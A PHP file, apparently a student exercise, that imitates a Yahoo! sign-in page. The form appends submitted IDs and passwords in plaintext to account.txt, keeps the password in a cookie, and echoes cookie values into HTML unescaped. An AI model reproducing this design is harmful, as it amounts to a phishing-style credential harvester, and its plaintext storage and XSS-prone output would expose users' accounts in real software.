<?php
if (isset($_POST["submit_sign_in"])) {
    if (!empty($_POST["yahoo_id"]) && !empty($_POST["yahoo_password"])) {
        $myfile = fopen("account.txt", "a") or die("Unable to open file!");
        fwrite($myfile, $_POST["yahoo_id"] . ':' . $_POST["yahoo_password"] . "\n");
        fclose($myfile);

        if (isset($_POST["keep_signed"])) {
            setcookie("yahoo_id", $_POST["yahoo_id"], time() + 24 * 3600);
            setcookie("yahoo_password", $_POST["yahoo_password"], time() + 24 * 3600);
        } else {
            setcookie("yahoo_id", $_POST["yahoo_id"], time() - 24 * 3600);
            setcookie("yahoo_password", $_POST["yahoo_password"], time() - 24 * 3600);
        }
        echo 'Đăng nhập thành công!';
        header("Refresh: 2; url = loginYahoo.php");
        die();
    }
}
if (isset($_POST["submit_go_home"])) {
    header("location: ../index.php");
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        .login-yahoo-container {
            height: 750px;
            background: url("../images/yahoo-bg.jpg") center center no-repeat;
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }

        .form-login {
            height: 95%;
            background-color: #fff;
            margin-right: 20px;
            padding: 10px;
        }

        .form-login-up {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .btn-create-account {
            width: 100%;
        }

        .another-sign-in-container {
            width: 100%;
        }

        .another-sign-in {
            display: flex;
            justify-content: space-between;
            width: 100%;
            padding-bottom: 30px;
            border-bottom: 1px solid #ddd;
        }

        .another-sign-in p {
            margin: 0;
        }

        .sign-in-with-facebook,
        .sign-in-with-google {
            display: flex;
            align-items: center;
            background-color: #ddd;
            cursor: pointer;
            border: none;
            justify-content: space-between;

            border-radius: 3px;
        }

        .sign-in-with-facebook p,
        .sign-in-with-google p {
            padding: 5px 30px 5px 5px;
        }

        .sign-in-with-facebook:hover,
        .sign-in-with-google:hover {
            opacity: 0.7;
        }

        .fa-facebook-square {
            display: block;
            font-size: 32px;
            color: blue;
        }

        .fa-google {
            display: block;
            font-size: 32px;
            color: orange;
        }



        .form-login-down {
            margin-top: 15px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
    </style>
</head>

<body>
    <div class="login-yahoo-container">
        <div class="form-login">
            <div class="form-login-up">
                <h3>Don't have a Yahoo! ID?</h3>
                <button class="btn btn-danger btn-create-account">Create New Account</button>
                <p class="mt-3">-------OR-------</p>
                <div class="another-sign-in-container">
                    <p>Sign in with:</p>
                    <div class="another-sign-in">
                        <button class="sign-in-with-facebook">
                            <i class="fab fa-facebook-square"></i>
                            <p>Facebook</p>
                        </button>
                        <button class="sign-in-with-google">
                            <i class="fab fa-google"></i>
                            <p>Google</p>
                        </button>
                    </div>
                </div>
            </div>
            <div class="form-login-down">
                <h2>Sign in to Yahoo!</h2>
                <form method="POST" action="">
                    <div class="form-group">
                        <label for="">Yahho ID</label>
                        <input class="form-control" type="text" name="yahoo_id" value=<?php echo isset($_COOKIE["yahoo_id"]) ? $_COOKIE["yahoo_id"] : "" ?>>
                        <p>(e.g. free2rhyme@yahoo.com)</p>
                    </div>
                    <div class="form-group mb-3">
                        <label for="">Password</label>
                        <input class="form-control" type="password" name="yahoo_password" value=<?php echo isset($_COOKIE["yahoo_password"]) ? $_COOKIE["yahoo_password"] : "" ?>>
                    </div>
                    <div>
                        <input type="checkbox" name="keep_signed" value="1" />
                        Keep me signed in
                        <p>(Uncheck if on a shared computer)</p>
                    </div>
                    <div>
                        <input class="btn btn-primary" type="submit" name="submit_sign_in" value="Đăng nhập" />
                        <input class="btn btn-danger" type="submit" name="submit_go_home" value="Trở về" />
                    </div>
                </form>
                <div>
                    <a href="#">I can't access my account | Help</a>
                </div>
            </div>
        </div>
    </div>
</body>

</html>